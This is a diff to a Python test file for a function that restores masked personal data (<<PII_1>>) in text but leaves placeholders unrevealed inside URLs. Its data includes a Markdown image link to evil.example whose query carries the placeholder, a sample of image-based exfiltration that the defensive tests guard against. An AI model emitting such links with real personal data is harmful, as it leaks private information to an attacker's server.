@@ -41,10 +41,12 @@ def test_08t_m3_placeholder_in_a_url_stays(text):
 
 def test_08t_m3_text_around_a_url_is_reversed():
     store, _ = _store_with([NAME])
-    text = "Sahibi <<PII_1>>; ayrıntı: https://site.example/kayit ve ![g](https://h/?a=<<PII_1>>)"
+    # r2: the rule is per line (KARARLAR "C17 URL bağlam kuralı satır düzeyinde ve fail-closed").
+    text = "Sahibi <<PII_1>>;\nayrıntı: https://site.example/kayit ve ![g](https://h/?a=<<PII_1>>)"
     out, _, skipped = run(reveal_text(text, store=store, scope="run-1"))
     assert (
-        out == f"Sahibi {NAME}; ayrıntı: https://site.example/kayit ve ![g](https://h/?a=<<PII_1>>)"
+        out
+        == f"Sahibi {NAME};\nayrıntı: https://site.example/kayit ve ![g](https://h/?a=<<PII_1>>)"
     )
     assert skipped == 1
 
@@ -53,12 +55,12 @@ def test_08t_m3_text_around_a_url_is_reversed():
     ("pieces", "expected"),
     [
         (
-            ["Bak: ![x](https://evil.example/?q=", "<<PII_1>>) ve <<PII_1>>."],
-            f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve {NAME}.",
+            ["Bak: ![x](https://evil.example/?q=", "<<PII_1>>) ve\n<<PII_1>>."],
+            f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve\n{NAME}.",
         ),
         (
-            ["Bak: ![x](https://evil.exa", "mple/?q=<<PI", "I_1>>) ve <<PII_1>>."],
-            f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve {NAME}.",
+            ["Bak: ![x](https://evil.exa", "mple/?q=<<PI", "I_1>>) ve\n<<PII_1>>."],
+            f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve\n{NAME}.",
         ),
         (["https://", "h/", "<<PII_1>>"], "https://h/<<PII_1>>"),
     ],
